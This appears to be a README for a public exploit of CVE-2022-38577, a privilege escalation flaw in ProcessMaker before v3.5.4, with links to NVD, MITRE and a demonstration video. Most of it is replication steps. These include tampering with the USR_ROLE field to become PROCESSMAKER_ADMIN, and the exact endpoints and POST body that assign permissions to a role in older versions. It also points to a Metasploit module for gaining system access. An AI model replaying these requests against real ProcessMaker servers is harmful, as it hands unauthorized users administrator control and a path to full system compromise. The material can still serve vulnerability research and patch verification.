# ProcessMaker - User Profile Privilege Escalation
# CVE-2022-38577
ProcessMaker before v3.5.4 was discovered to contain insecure permissions in the user profile page. This vulnerability allows attackers to escalate normal users to Administrators.

\* This exploit can be used with the Metasploit module [(ProcessMaker Plugin Upload)](https://www.rapid7.com/db/modules/exploit/multi/http/processmaker_plugin_upload/) - **exploit/multi/http/processmaker_plugin_upload** to gain system access.

```
Privilege Escalation replication.
for 2.5.0 - 3.0 GA:
    1. Log in as normal user.
    2. Change "USR_ROLE" on post request form when updating profile information to "PROCESSMAKER_ADMIN".
    3. Refresh page to get new role.

for 3.2.1 and before:
    1. Log in as normal user.
    2. Get Role ID by request "/sysworkflow/en/neoclassic/roles/roles_Ajax?request=rolesList&_dc={epoch_time}"
    3. Get Permission ID by request "/sysworkflow/en/neoclassic/roles/data_rolesPermissions?rUID={Role_ID}&type=show"
    4. Update role to escalation privileges using POST Body request:
    POST /sysworkflow/en/neoclassic/roles/roles_Ajax
    request=assignPermissionToRoleMultiple&ROL_UID={Role_ID}&PER_UID={PERMISSION_ID}
```
https://youtu.be/PVaChDG3ZQ0<br/>
[![CVE-2022-38577 : ProcessMaker - User Profile Privilege Escalation](https://img.youtube.com/vi/PVaChDG3ZQ0/0.jpg)](https://www.youtube.com/watch?v=PVaChDG3ZQ0)

### TODO: Optimize code [requests module], and Exception Handling.

Reference:<br />
[x] https://nvd.nist.gov/vuln/detail/CVE-2022-38577<br />
[x] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-38577<br />
[x] https://packetstormsecurity.com/files/168427/ProcessMaker-Privilege-Escalation.html<br />
[x] https://drive.google.com/file/d/1iP9NYUkYEy_FGMpcnTkUWn8nGcqDT02_/view?usp=sharing<br />

